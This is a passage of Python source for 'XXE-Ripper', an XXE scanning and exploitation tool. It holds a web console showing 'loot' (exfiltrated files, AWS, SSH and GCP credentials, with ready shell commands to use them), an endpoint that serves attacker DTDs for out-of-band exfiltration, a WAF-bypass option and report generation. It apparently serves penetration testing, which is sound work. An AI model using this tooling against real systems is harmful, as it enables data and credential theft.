          text-transform:uppercase;flex-shrink:0;padding-top:2px">
          exfiltrated
        </span>
        <pre style="margin:0;flex:1;font-family:var(--mono);
          font-size:10.5px;line-height:1.55;color:var(--fg-2);
          white-space:pre-wrap;word-break:break-word;
          max-height:120px;overflow:auto">
${esc(d.exfil_preview || "")}</pre>
        ${d.loot_id ? copyBtnHTML(d.exfil_preview || "",
                                  "Copy exfiltrated content") : ""}
      </div>` : "";
    return `
      <div style="border-bottom:1px solid var(--line)">
        <div style="display:flex;gap:12px;padding:8px 14px;
          font-size:11.5px;align-items:center">
          <span class="sev-label ${cls}" style="min-width:100px">
            [${mark}] ${esc(d.technique || "oob")}
          </span>
          <span style="color:var(--accent);font-family:var(--mono);
            flex:1;overflow:hidden;text-overflow:ellipsis;
            white-space:nowrap">
            ${esc(sub)}
          </span>
          ${d.note ? `<span style="color:var(--fg-3);font-size:10.5px">
            ${esc(d.note)}</span>` : ""}
          ${copyBtnHTML(sub, "Copy subdomain")}
        </div>
        ${exfilBlock}
      </div>`;
  }).join("");
}

function renderLoot(){
  const el = $("centerBody");
  if (!state.loot.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <path d="M21 8v13H3V8M1 3h22v5H1zM10 12h4"/>
        </svg>
        <strong>No loot recovered</strong>
        <span>Files, credentials, and other extracted content will
          appear here</span>
      </div>`;
    return;
  }
  // Sort: files first, secrets second; newest first within each
  const sorted = state.loot.slice().sort((a, b) => {
    const ka = a.kind === "file" ? 0 : 1;
    const kb = b.kind === "file" ? 0 : 1;
    if (ka !== kb) return ka - kb;
    return (b.ts || 0) - (a.ts || 0);
  });
  el.innerHTML = sorted.map(l => {
    const isFile = l.kind === "file";
    const creds = l.credentials || [];
    const kindLabel = isFile ? "file" : (l.kind || "secret");
    const path = l.source_path || l.source_url || "—";
    const content = l.content || "";
    const preview = content.length > 400
      ? content.slice(0, 400) + "…" : content;
    const credBlock = creds.length ? `
      <div class="loot-creds">
        <div class="loot-creds-label">${creds.length}
          credential(s) extracted</div>
        ${creds.map(c => `
          <div class="loot-cred">
            <span class="loot-cred-kind">${esc(c.kind || "secret")}</span>
            ${Object.entries(c.fields || {}).map(([k, v]) =>
              `<span class="loot-cred-field">
                 <b>${esc(k)}</b> ${esc(String(v).slice(0, 48))}
               </span>`).join("")}
          </div>
        `).join("")}
      </div>` : "";
    return `
      <div class="loot-item" data-loot-id="${esc(l.id)}">
        <div class="loot-head">
          <span class="loot-kind loot-kind-${esc(kindLabel)}">
            ${esc(kindLabel)}
          </span>
          <span class="loot-path" title="${esc(path)}">
            ${esc(path)}
          </span>
          <span class="loot-size">${l.size || 0}B</span>
          ${copyBtnHTML(content, "Copy full content")}
        </div>
        <div class="loot-tech dim">${esc(l.technique || "")}${
          l.truncated ? " · <span style=\"color:var(--high)\">truncated"
                        + " at 256 KB</span>" : ""
        }</div>
        <pre class="loot-pre">${esc(preview)}</pre>
        ${credBlock}
      </div>`;
  }).join("");
}

function renderLog(){
  const el = $("centerBody");
  if (!state.logs.length){
    el.innerHTML = `
      <div class="empty">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <path d="M4 6h16M4 12h16M4 18h10"/>
        </svg>
        <strong>No log entries</strong>
        <span>Enable debug logging in scan options for verbose output</span>
      </div>`;
    return;
  }
  el.innerHTML = state.logs.map(ev => {
    const level = ev.data?.level || "debug";
    const msg = ev.data?.msg || "";
    const cls = level === "warn" ? "color:var(--high)"
              : level === "error" ? "color:var(--crit)"
              : "color:var(--fg-2)";
    return `
      <div style="display:flex;gap:12px;padding:4px 14px;
        font-family:var(--mono);font-size:11px;line-height:1.6;
        border-bottom:1px solid rgba(255,255,255,.02)">
        <span style="color:var(--fg-4);flex-shrink:0;min-width:68px;
          font-variant-numeric:tabular-nums">${fmtTime(ev.ts)}</span>
        <span style="${cls};flex:1;word-break:break-word;
          white-space:pre-wrap">${esc(msg)}</span>
      </div>`;
  }).join("");
}

// =================================================================
// Inspector
// =================================================================
document.querySelectorAll(".itab").forEach(t => {
  t.addEventListener("click", () => {
    state.inspTab = t.dataset.tab;
    document.querySelectorAll(".itab").forEach(x =>
      x.classList.toggle("active", x.dataset.tab === state.inspTab));
    renderInspector();
  });
});

function selectFinding(fid){
  state.selectedFindingId = fid;
  renderFindings();
  renderInspector();
  const tr = document.querySelector(`tr[data-fid="${CSS.escape(fid)}"]`);
  if (tr) tr.scrollIntoView({block:"nearest"});
}

function copyBtnHTML(text, title){
  return `<button class="copy-btn" title="${esc(title||"Copy")}"
    data-copy="${b64enc(text)}">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
         stroke-width="2" stroke-linecap="round">
      <rect x="9" y="9" width="13" height="13" rx="2"/>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
    </svg></button>`;
}

function renderInspector(){
  const body = $("inspBody");
  const f = state.findings.find(x => x.id === state.selectedFindingId);
  if (!f){
    $("inspTabs").style.display = "none";
    body.innerHTML = `
      <div class="empty" style="padding-top:60px">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor"
             stroke-width="1.5">
          <circle cx="11" cy="11" r="7"/>
          <line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        <strong>No selection</strong>
        <span>Select a finding to inspect its details</span>
      </div>`;
    return;
  }
  $("inspTabs").style.display = "flex";

  if (state.inspTab === "overview") return renderInspOverview(f);
  if (state.inspTab === "evidence") return renderInspEvidence(f);
  if (state.inspTab === "reasons")  return renderInspReasons(f);
  if (state.inspTab === "raw")      return renderInspRaw(f);
}

function renderInspOverview(f){
  const sev = esc(f.severity || "INFO");
  const cwes = (f.cwe || []).map(c =>
    `<span class="insp-chip cwe">${esc(c)}</span>`).join("");
  const chips = [
    f.confirmed ? `<span class="insp-chip ok">confirmed</span>` : "",
    f.confidence ? `<span class="insp-chip">confidence ${f.confidence}</span>` : "",
    f.exploitability ? `<span class="insp-chip">${esc(f.exploitability)}</span>` : "",
  ].join("");

  $("inspBody").innerHTML = `
    <div class="insp-hero">
      <span class="insp-chip sev-${sev}">${sev}</span>
      <span style="font-family:var(--mono);font-size:11px;
        color:var(--fg-3);flex:1;overflow:hidden;
        text-overflow:ellipsis;white-space:nowrap"
        title="${esc(f.id)}">${esc(f.id)}</span>
      ${copyBtnHTML(f.id, "Copy finding ID")}
    </div>
    <h2 class="insp-title">${esc(f.title || "")}</h2>
    <div class="insp-meta">${cwes}${chips}</div>

    ${f.description ? `
    <div class="insp-section">
      <div class="insp-label">
        Description
        <span class="spacer"></span>
        ${copyBtnHTML(f.description, "Copy description")}
      </div>
      <p class="insp-p">${esc(f.description)}</p>
    </div>` : ""}

    ${f.impact ? `
    <div class="insp-section">
      <div class="insp-label">
        Impact
        <span class="spacer"></span>
        ${copyBtnHTML(f.impact, "Copy impact")}
      </div>
      <p class="insp-p">${esc(f.impact)}</p>
    </div>` : ""}

    ${f.evidence && f.evidence.loot_id ? `
    <div class="insp-section">
      <div class="insp-label">
        Extracted content
        <span class="spacer"></span>
        ${copyBtnHTML(f.evidence.extracted_content_preview || "",
                      "Copy preview")}
      </div>
      <pre class="code">${esc(f.evidence.extracted_content_preview || "")}</pre>
    </div>` : ""}

    ${f.evidence && f.evidence.extracted_credentials
      && f.evidence.extracted_credentials.length ? `
    <div class="insp-section">
      <div class="insp-label">
        Credentials (${f.evidence.extracted_credentials.length})
        <span class="spacer"></span>
        ${copyBtnHTML(
          f.evidence.extracted_credentials
            .map(c => (c.snippets || [])
              .map(s => `# ${s.label}\n${s.shell}`).join("\n\n"))
            .join("\n\n---\n\n"),
          "Copy all commands")}
      </div>
      ${f.evidence.extracted_credentials.map(c => `
        <div style="margin-bottom:12px;padding:10px 12px;
          background:var(--bg-1);border:1px solid var(--line);
          border-radius:var(--radius-sm)">
          <div style="font-family:var(--mono);font-size:10.5px;
            font-weight:600;color:var(--crit);text-transform:uppercase;
            letter-spacing:.05em;margin-bottom:6px">
            ${esc(c.kind || "secret")}
          </div>
          ${Object.entries(c.fields || {}).map(([k, v]) => `
            <div style="font-family:var(--mono);font-size:10.5px;
              color:var(--fg-2);padding:2px 0">
              <span style="color:var(--fg-4)">${esc(k)}</span>
              ${esc(String(v))}
            </div>`).join("")}
          ${(c.snippets || []).map(s => `
            <div style="margin-top:8px">
              <div style="display:flex;align-items:center;gap:8px;
                font-size:10.5px;color:var(--fg-3);margin-bottom:4px">
                <span>${esc(s.label || "")}</span>
                ${copyBtnHTML(s.shell || "", "Copy command")}
              </div>
              <pre class="code">${esc(s.shell || "")}</pre>
            </div>`).join("")}
        </div>`).join("")}
    </div>` : ""}
    ${(f.reasons && f.reasons.length) ? `
    <div class="insp-section">
      <div class="insp-label">
        Reasons (${f.reasons.length})
        <span class="spacer"></span>
        ${copyBtnHTML(f.reasons.join("\n"), "Copy reasons")}
      </div>
      <ul class="insp-reasons">
        ${f.reasons.map(r => `<li>${esc(r)}</li>`).join("")}
      </ul>
    </div>` : ""}
  `;
}

function renderInspEvidence(f){
  const ev = f.evidence || {};
  const keys = Object.keys(ev);
  if (!keys.length){
    $("inspBody").innerHTML = `
      <div class="empty" style="padding-top:60px">
        <strong>No structured evidence</strong>
        <span>This finding has no structured evidence dict</span>
      </div>`;
    return;
  }
  const rows = keys.map(k => {
    let v = ev[k];
    if (Array.isArray(v)) v = v.join(", ");
    else if (typeof v === "object" && v !== null) v = JSON.stringify(v);
    return `<span class="k">${esc(k)}</span>
            <span class="v">${esc(String(v))}</span>`;
  }).join("");
  $("inspBody").innerHTML = `
    <div class="insp-section">
      <div class="insp-label">
        Evidence
        <span class="spacer"></span>
        ${copyBtnHTML(JSON.stringify(ev, null, 2), "Copy as JSON")}
      </div>
      <pre class="code kv">${rows}</pre>
    </div>`;
}

function renderInspReasons(f){
  const reasons = f.reasons || [];
  if (!reasons.length){
    $("inspBody").innerHTML = `
      <div class="empty" style="padding-top:60px">
        <strong>No reasons recorded</strong>
      </div>`;
    return;
  }
  $("inspBody").innerHTML = `
    <div class="insp-section">
      <div class="insp-label">
        Reasons (${reasons.length})
        <span class="spacer"></span>
        ${copyBtnHTML(reasons.join("\n"), "Copy reasons")}
      </div>
      <ul class="insp-reasons">
        ${reasons.map(r => `<li>${esc(r)}</li>`).join("")}
      </ul>
    </div>`;
}

function renderInspRaw(f){
  const json = JSON.stringify(f, null, 2);
  $("inspBody").innerHTML = `
    <div class="insp-section">
      <div class="insp-label">
        Raw finding JSON
        <span class="spacer"></span>
        ${copyBtnHTML(json, "Copy raw JSON")}
      </div>
      <pre class="code">${esc(json)}</pre>
    </div>`;
}

document.addEventListener("click", async e => {
  const btn = e.target.closest("[data-copy]");
  if (!btn) return;
  e.preventDefault();
  e.stopPropagation();
  const text = b64dec(btn.dataset.copy);
  const ok = await copyText(text);
  if (ok){
    btn.classList.add("copied");
    setTimeout(() => btn.classList.remove("copied"), 1000);
  }
});

// =================================================================
// Status bar
// =================================================================
function updateStatusTotals(){
  let f = 0, c = 0, h = 0;
  for (const j of state.jobs){
    f += j.n_findings || 0;
    c += j.n_critical || 0;
    h += j.n_high || 0;
  }
  $("sbTargets").textContent = state.jobs.length;
  $("sbFindings").textContent = f;
  $("sbCrit").textContent = c;
  $("sbHigh").textContent = h;
}

function updateStatusBar(snap){
  const finds = state.findings;
  const crit = finds.filter(f => f.severity === "CRITICAL").length;
  const high = finds.filter(f => f.severity === "HIGH").length;
  $("sbFindings").textContent = finds.length;
  $("sbCrit").textContent = crit;
  $("sbHigh").textContent = high;
  $("sbLoot").textContent = state.loot.length;

  const phaseEv = state.events.filter(e => e.kind === "phase_start").pop();
  if (phaseEv && snap.status === "running"){
    $("sbPhase").style.display = "flex";
    $("sbPhaseName").textContent = phaseEv.data?.name || "—";
  } else {
    $("sbPhase").style.display = "none";
  }
}

// =================================================================
// Actions
// =================================================================
function exportJob(jid, fmt){
  if (!jid) return;
  window.open(`/api/jobs/${jid}/report?format=${fmt}`, "_blank");
}

async function stopSelected(){
  if (!state.selectedJobId) return;
  const ok = await confirmModal("Stop scan?",
    "This will cancel the running scan. Findings collected so far are kept.",
    true);
  if (!ok) return;
  try {
    await fetch(`/api/jobs/${state.selectedJobId}/cancel`, {
      method:"POST",
      cache: "no-store",
    });
    toast("Stop requested", "ok");
  } catch(e){ toast("Failed: " + e, "err"); }
}

async function rerunSelected(){
  if (!state.selectedJobId) return;
  const fresh = await fetch(`/api/jobs/${state.selectedJobId}`,
    { cache: "no-store" }).then(r => r.json());
  if (!fresh || !fresh.config) return;
  try {
    const r = await fetch("/api/scan", {
      method:"POST",
      headers:{"Content-Type":"application/json"},
      cache: "no-store",
      body: JSON.stringify(fresh.config),
    });
    const j = await r.json();
    if (j.job_id){
      toast("Re-run started", "ok");
      await refreshJobs();
      selectJob(j.job_id);
    }
  } catch(e){ toast("Failed: " + e, "err"); }
}

function toggleDensity(){
  state.density = state.density === "compact" ? "comfortable" : "compact";
  localStorage.setItem("xxe.density", state.density);
  applyDensity();
}
function applyDensity(){
  const compact = state.density === "compact";
  document.querySelectorAll("table.findings td").forEach(td => {
    td.style.padding = compact ? "4px 10px" : "7px 10px";
  });
  $("tbDensity").classList.toggle("on", compact);
}

function confirmModal(title, msg, danger){
  return new Promise(resolve => {
    $("modalTitle").textContent = title;
    $("modalMsg").textContent = msg;
    $("modalConfirm").className = "modal-btn" + (danger ? " danger" : "");
    $("modalBackdrop").classList.add("open");
    const cleanup = () => {
      $("modalBackdrop").classList.remove("open");
      $("modalConfirm").onclick = null;
      $("modalCancel").onclick = null;
    };
    $("modalConfirm").onclick = () => { cleanup(); resolve(true); };
    $("modalCancel").onclick = () => { cleanup(); resolve(false); };
  });
}

// =================================================================
// Wiring
// =================================================================
document.querySelectorAll("[data-cmd]").forEach(el => {
  el.addEventListener("click", () => {
    const cmd = el.dataset.cmd;
    if (cmd === "stop") stopSelected();
    else if (cmd === "rerun") rerunSelected();
    else if (cmd === "new") openDrawer();
    else if (cmd === "export-json") exportJob(state.selectedJobId, "json");
    else if (cmd === "export-sarif") exportJob(state.selectedJobId, "sarif");
    else if (cmd === "export-html")
      window.open(`/api/jobs/${state.selectedJobId}/report.html.download`,
                  "_blank");
    else if (cmd === "view-html")
      window.open(`/api/jobs/${state.selectedJobId}/report.html`,
                  "_blank");
  });
});

document.querySelectorAll("#sevToggles .sev-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    const sev = btn.dataset.sev;
    if (state.activeSevs.has(sev)){
      state.activeSevs.delete(sev);
      btn.classList.remove("on");
    } else {
      state.activeSevs.add(sev);
      btn.classList.add("on");
    }
    renderFindings();
  });
});

$("tbFilter").addEventListener("input", e => {
  state.filter = e.target.value;
  if (state.centerTab !== "findings"){
    state.centerTab = "findings";
    document.querySelectorAll(".ptab").forEach(x =>
      x.classList.toggle("active", x.dataset.tab === "findings"));
  }
  renderCenter();
});

$("tbDensity").addEventListener("click", toggleDensity);

// =================================================================
// Keyboard shortcuts
// =================================================================
document.addEventListener("keydown", e => {
  if ((e.metaKey || e.ctrlKey) && e.key.toLowerCase() === "k"){
    e.preventDefault();
    if ($("cmdkBackdrop").classList.contains("open")) closeCmdk();
    else openCmdk();
    return;
  }

  if (e.target.matches("input, textarea, select")) return;
  if ($("cmdkBackdrop").classList.contains("open")) return;
  if ($("drawerBackdrop").classList.contains("open")){
    if (e.key === "Escape") closeDrawer();
    return;
  }

  if (e.key === "Escape"){
    if (openMenu){ closeAllMenus(); e.preventDefault(); return; }
    if ($("shortcutsBackdrop").classList.contains("open")){
      $("shortcutsBackdrop").classList.remove("open");
      e.preventDefault(); return;
    }
    if ($("aboutBackdrop").classList.contains("open")){
      $("aboutBackdrop").classList.remove("open");
      e.preventDefault(); return;
    }
  }

  const jobs = state.jobs;
  const idx = jobs.findIndex(j => j.id === state.selectedJobId);

  switch (e.key){
    case "j":
      e.preventDefault();
      if (jobs.length){
        const n = Math.min(jobs.length - 1, (idx < 0 ? -1 : idx) + 1);
        selectJob(jobs[n].id);
      }
      break;
    case "k":
      e.preventDefault();
      if (jobs.length){
        const n = Math.max(0, (idx < 0 ? 0 : idx) - 1);
        selectJob(jobs[n].id);
      }
      break;
    case "n":
      e.preventDefault();
      navigateFinding(1);
      break;
    case "p":
      e.preventDefault();
      navigateFinding(-1);
      break;
    case "/":
      e.preventDefault();
      $("tbFilter").focus();
      break;
    case "c":
      e.preventDefault();
      openDrawer();
      break;
    case "r":
      e.preventDefault();
      if (state.selectedJobId) rerunSelected();
      break;
    case "?":
      e.preventDefault();
      $("shortcutsBackdrop").classList.add("open");
      break;
    case "Escape":
      if (state.filter){
        state.filter = "";
        $("tbFilter").value = "";
        renderCenter();
      } else if (state.selectedFindingId){
        state.selectedFindingId = null;
        renderFindings();
        renderInspector();
      } else if (state.selectedJobId){
        closeDetail();
      }
      break;
  }
});

function navigateFinding(delta){
  const filtered = getFilteredFindings();
  if (!filtered.length) return;
  const idx = filtered.findIndex(f => f.id === state.selectedFindingId);
  const n = Math.max(0, Math.min(filtered.length - 1,
                                 (idx < 0 ? 0 : idx) + delta));
  if (n !== idx){
    selectFinding(filtered[n].id);
  }
}

// Re-poll immediately when the tab regains focus — background
// polling is throttled by browsers on inactive tabs.
document.addEventListener("visibilitychange", () => {
  if (!document.hidden){
    refreshJobs();
    if (state.selectedJobId) pollCurrentJob();
  }
});
window.addEventListener("focus", () => {
  refreshJobs();
  if (state.selectedJobId) pollCurrentJob();
});

// =================================================================
// Boot
// =================================================================
(async function boot(){
  applyDensity();

  const mapping = [
    ["timing","timing"], ["svg","svg"], ["saml","saml"],
    ["full_file_scan","full_file_scan"], ["unsafe","unsafe"],
    ["debug","debug"],
  ];
  for (const [key, elId] of mapping){
    const el = $(elId);
    if (el && state.defaults[key] !== undefined){
      el.checked = state.defaults[key];
    }
  }

  // WAF bypass is opt-in per scan — force it off on every page load,
  // regardless of what the previous session left behind.
  $("bypass_waf").checked = false;
  $("bypass_waf_include_custom").checked = false;
  $("wafPanel").style.display = "none";

  await refreshJobs();
  setInterval(refreshJobs, 2000);
})();
</script>
</body>
</html>
"""

def run_webui_server(host: str, port: int):
    try:
        from flask import Flask, request as freq, jsonify, Response
    except ImportError:
        warn("Flask is required for --serve. "
             "Install with: pip install flask")
        sys.exit(1)

    web = Flask("xxeripper_webui")

    @web.route("/")
    def _index():
        return Response(WEBUI_HTML, mimetype="text/html")

    @web.route("/api/health")
    def _health():
        with _JOBS_LOCK:
            n = len(_JOBS)
        return jsonify({
            "ok": True,
            "pid": os.getpid(),
            "jobs": n,
            "version": "1.0.0",
        })

    @web.route("/api/scan", methods=["POST"])
    def _start_scan():
        cfg = freq.get_json(silent=True) or {}
        url = (cfg.get("url") or "").strip()
        burp = (cfg.get("burp_request_raw") or "").strip()
        if not url and not burp:
            return jsonify({"error": "url or burp_request_raw is required"}), 400
        if url and "://" not in url:
            url = "http://" + url
        cfg["url"] = url

        job_id = uuid.uuid4().hex[:12]
        job = ScanJob(job_id, cfg)
        with _JOBS_LOCK:
            _JOBS[job_id] = job
        threading.Thread(
            target=_run_scan_job, args=(job,),
            name=f"scan-{job_id}", daemon=True,
        ).start()
        return jsonify({"job_id": job_id})

    @web.route("/api/jobs")
    def _list_jobs():
        with _JOBS_LOCK:
            jobs = list(_JOBS.values())
        jobs.sort(key=lambda j: j.started_at or 0, reverse=True)
        out = []
        for j in jobs:
            n, c = j.counts()
            out.append({
                "id": j.id,
                "url": j.config.get("url", ""),
                "status": j.status,
                "started_at": j.started_at,
                "finished_at": j.finished_at,
                "n_findings": n,
                "n_critical": c,
            })
        return jsonify(out)

    @web.route("/api/jobs/<jid>")
    def _job_detail(jid):
        job = _JOBS.get(jid)
        if job is None:
            return jsonify({"error": "not found"}), 404
        since = freq.args.get("since", 0, type=int)
        return jsonify(job.snapshot(since=since))

    @web.route("/api/jobs/<jid>/cancel", methods=["POST"])
    def _cancel_job(jid):
        job = _JOBS.get(jid)
        if job is None:
            return jsonify({"error": "not found"}), 404
        job.cancel()
        return jsonify({"ok": True})

    @web.route("/api/jobs/<jid>/report")
    def _job_report(jid):
        job = _JOBS.get(jid)
        if job is None:
            return jsonify({"error": "not found"}), 404

        fmt = freq.args.get("format", "json")

        if fmt == "sarif":
            results = [job.result] if job.result else []
            sarif = build_sarif(results)
            body = json.dumps(sarif, indent=2)
            r = Response(body, content_type="application/sarif+json")
            r.headers["Content-Disposition"] = (
                f'attachment; filename="xxeripper-{jid}.sarif"'
            )
            return r

        if job.result is None:
            return jsonify({"error": "job not finished"}), 409

        payload = {
            "schema_version": "1.1",
            "tool": "XXE-Ripper",
            "results": [job.result],
        }
        body = json.dumps(payload, indent=2)
        r = Response(body, content_type="application/json")
        r.headers["Content-Disposition"] = (
            f'attachment; filename="xxeripper-{jid}.json"'
        )
        return r

    @web.route("/api/jobs/<jid>/report.html")
    def _job_report_html(jid):
        job = _JOBS.get(jid)
        if job is None:
            return jsonify({"error": "not found"}), 404
        results = [job.result] if job.result else []
        html = build_html_report(results,
                                 meta={"invocation": "webui"})
        r = Response(html, mimetype="text/html")
        r.headers["Content-Disposition"] = (
            f'inline; filename="xxeripper-{jid}.html"'
        )
        return r

    @web.route("/api/jobs/<jid>/report.html.download")
    def _job_report_html_download(jid):
        job = _JOBS.get(jid)
        if job is None:
            return jsonify({"error": "not found"}), 404
        results = [job.result] if job.result else []
        html = build_html_report(results,
                                 meta={"invocation": "webui"})
        r = Response(html, mimetype="text/html")
        r.headers["Content-Disposition"] = (
            f'attachment; filename="xxeripper-{jid}.html"'
        )
        return r

    @web.route("/dtd/<token>.dtd")
    def _serve_dtd(token: str):
        with _WEBUI_DTDS_LOCK:
            content = _WEBUI_DTDS.get(token)
        if content is None:
            return Response("", status=404, mimetype="text/plain")
        return Response(content, mimetype="application/xml")

    @web.route("/api/jobs/<jid>", methods=["DELETE"])
    def _delete_job(jid):
        with _JOBS_LOCK:
            _JOBS.pop(jid, None)
        return jsonify({"ok": True})

    import atexit
    atexit.register(_shutdown_webui_oob_manager)

    print(f"[*] XXE-Ripper web console")
    print(f"[*]   URL:  http://{host}:{port}")
    print(f"[*]   127.0.0.1 by default. Do NOT expose to untrusted networks.")
    print(f"[*]   Ctrl+C to stop.")
    print(f"[*]   OOB auto mode available via the WebUI "
          f"(interactsh-client will be spawned on first use).")

    web.run(host=host, port=port, debug=False, threaded=True,
            use_reloader=False)

# ---------------------------------------------------------------------------
# Self-contained HTML report
# ---------------------------------------------------------------------------

def _html_esc(s) -> str:
    return (str(s) if s is not None else "").replace(
        "&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace(
        '"', "&quot;").replace("'", "&#39;")


def _html_copy_btn(text: str, label: str = "copy") -> str:
    b64 = base64.b64encode((text or "").encode()).decode()
    return (f'<button class="copy" data-c="{b64}" '
            f'title="Copy">{_html_esc(label)}</button>')


def build_html_report(results: List[Dict],
                      meta: Optional[Dict[str, Any]] = None) -> str:
    meta = meta or {}
    generated = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())

    totals = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0,
              "confirmed": 0}
    for r in results:
        for f in r.get("findings", []):
            sev = f.get("severity", "INFO")
            if sev in totals:
                totals[sev] += 1
            if f.get("confirmed"):
                totals["confirmed"] += 1

    n_targets = len(results)
    n_vuln = sum(
        1 for r in results
        if any(f.get("severity") in ("CRITICAL", "HIGH", "MEDIUM")
               for f in r.get("findings", []))
    )
    worst = next((s for s in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO")
                  if totals.get(s, 0) > 0), "INFO")

    all_loot: List[Dict[str, Any]] = []
    for r in results:
        for entry in r.get("loot", []) or []:
            all_loot.append(entry)

    chains: List[Tuple[Dict, Dict]] = []
    for r in results:
        for f in r.get("findings", []):
            if f.get("id", "").startswith("XXE-CHAIN-"):
                chains.append((r, f))

    css = """
:root{
  --bg:#0a0a0c;--bg2:#111114;--bg3:#17171b;
  --line:#22222a;--fg:#e9e9ec;--fg2:#9d9da7;--fg3:#6a6a75;
  --crit:#f47174;--high:#fb923c;--med:#fbbf24;
  --accent:#6ea8fe;--ok:#4ade80;--violet:#c9a3f5;
}
*{box-sizing:border-box}
html,body{margin:0;padding:0;background:var(--bg);color:var(--fg);
  font:13.5px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",
  Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
.mono,pre,code{font-family:"JetBrains Mono","SF Mono",Menlo,Consolas,
  monospace;font-size:12px}
.dim{color:var(--fg3)}
a{color:var(--accent)}
.rpt-head{display:flex;align-items:center;gap:24px;
  padding:22px 32px;border-bottom:1px solid var(--line);
  background:var(--bg2);flex-wrap:wrap}
.rpt-brand{display:flex;align-items:center;gap:12px}
.rpt-brand svg{color:var(--accent);width:32px;height:32px}
.rpt-title{font-size:17px;font-weight:600;letter-spacing:-.005em}
.rpt-sub{font-size:11.5px;color:var(--fg3);
  font-family:"JetBrains Mono",monospace;margin-top:2px}
.rpt-totals{display:flex;gap:12px;margin-left:auto;flex-wrap:wrap}
.tcell{padding:8px 14px;border-radius:6px;background:var(--bg3);
  min-width:72px;text-align:center}
.tcell .tn{font-size:18px;font-weight:600;line-height:1}
.tcell .tl{font-size:9.5px;letter-spacing:.08em;text-transform:uppercase;
  color:var(--fg3);margin-top:3px}
.tcell.crit .tn{color:var(--crit)}
.tcell.high .tn{color:var(--high)}
.tcell.med  .tn{color:var(--med)}
.rpt-section{padding:32px;border-bottom:1px solid var(--line);
  max-width:1200px;margin:0 auto;width:100%}
.rpt-section h2{font-size:16px;font-weight:600;margin:0 0 6px;
  letter-spacing:-.005em}
.rpt-section h2 .badge{display:inline-block;
  font-family:"JetBrains Mono",monospace;font-size:10.5px;
  padding:1px 8px;border-radius:8px;background:var(--bg3);
  color:var(--fg2);margin-left:10px;vertical-align:middle;
  font-weight:400}
.summary-grid{display:grid;
  grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
  gap:14px;margin-top:18px}
.summary-grid>div{padding:14px 16px;background:var(--bg2);
  border:1px solid var(--line);border-radius:8px}
.summary-grid .sgl{display:block;font-size:10.5px;color:var(--fg3);
  text-transform:uppercase;letter-spacing:.06em;margin-bottom:6px}
.summary-grid .sgv{font-size:20px;font-weight:600}
.sev-CRITICAL{color:var(--crit)}
.sev-HIGH{color:var(--high)}
.sev-MEDIUM{color:var(--med)}
.sev-LOW{color:var(--fg2)}
.sev-INFO{color:var(--fg3)}

.cred{background:var(--bg2);border:1px solid var(--line);
  border-radius:8px;padding:18px 20px;margin-top:14px}
.cred-head{display:flex;align-items:center;gap:12px;margin-bottom:12px;
  flex-wrap:wrap}
.cred-kind{font-family:"JetBrains Mono",monospace;font-size:11px;
  font-weight:600;text-transform:uppercase;letter-spacing:.08em;
  color:var(--crit);background:rgba(244,113,116,.1);
  padding:2px 8px;border-radius:4px}
.cred-src{font-size:11px;color:var(--fg3);margin-right:auto}
.kv{width:100%;border-collapse:collapse;margin-bottom:14px}
.kv th{text-align:left;padding:5px 10px 5px 0;font-weight:500;
  font-size:11px;color:var(--fg3);vertical-align:top;
  white-space:nowrap;width:170px}
.kv td{padding:5px 0;font-family:"JetBrains Mono",monospace;
  font-size:11.5px;word-break:break-all}
.snippet{margin-top:12px}
.snip-head{display:flex;align-items:center;gap:10px;
  font-size:11px;color:var(--fg3);margin-bottom:5px;
  text-transform:uppercase;letter-spacing:.06em}
.snippet pre{margin:0;padding:11px 14px;background:var(--bg);
  border:1px solid var(--line);border-radius:5px;
  white-space:pre-wrap;word-break:break-all;color:var(--fg2)}

.loot-item{background:var(--bg2);border:1px solid var(--line);
  border-radius:8px;padding:16px 18px;margin-top:14px}
.loot-head{display:flex;align-items:center;gap:12px;
  margin-bottom:10px;flex-wrap:wrap}
.loot-kind{font-family:"JetBrains Mono",monospace;font-size:10.5px;
  font-weight:600;text-transform:uppercase;letter-spacing:.05em;
  padding:2px 8px;border-radius:4px;background:var(--bg3);
  color:var(--fg2)}
.loot-kind-file{color:var(--accent);background:rgba(110,168,254,.1)}
.loot-kind-aws_iam{color:var(--crit);background:rgba(244,113,116,.1)}
.loot-kind-ssh_private_key{color:var(--high);background:rgba(251,146,60,.1)}
.loot-kind-gcp_service_account{color:var(--violet);
  background:rgba(201,163,245,.1)}
.loot-path{font-family:"JetBrains Mono",monospace;font-size:12px;
  color:var(--fg);flex:1;word-break:break-all;min-width:0}
.loot-size{font-family:"JetBrains Mono",monospace;font-size:10.5px;
  color:var(--fg3)}
.loot-pre{margin:8px 0 0;padding:12px 14px;background:var(--bg);
  border:1px solid var(--line);border-radius:5px;
  white-space:pre-wrap;word-break:break-word;color:var(--fg2);
  font-size:11px;line-height:1.55;max-height:320px;overflow:auto}

.chain{background:var(--bg2);border:1px solid var(--line);
  border-radius:8px;padding:18px 20px;margin-top:14px}
.chain-title{font-size:14px;font-weight:600;margin:0 0 10px;
  letter-spacing:-.005em}
.chain-flow{font-family:"JetBrains Mono",monospace;font-size:12px;
  color:var(--accent);padding:10px 14px;background:var(--bg);
  border-radius:5px;margin-bottom:14px;word-break:break-word;
  line-height:1.7}
.chain-steps{margin:0;padding-left:22px}
.chain-steps li{margin-bottom:12px}
.step-name{font-family:"JetBrains Mono",monospace;font-size:12px;
  font-weight:600;color:var(--fg)}
.step-ev{margin-top:5px;font-family:"JetBrains Mono",monospace;
  font-size:10.5px;color:var(--fg3);background:var(--bg);
  padding:10px 12px;border-radius:4px;white-space:pre-wrap;
  word-break:break-all;max-height:220px;overflow:auto}

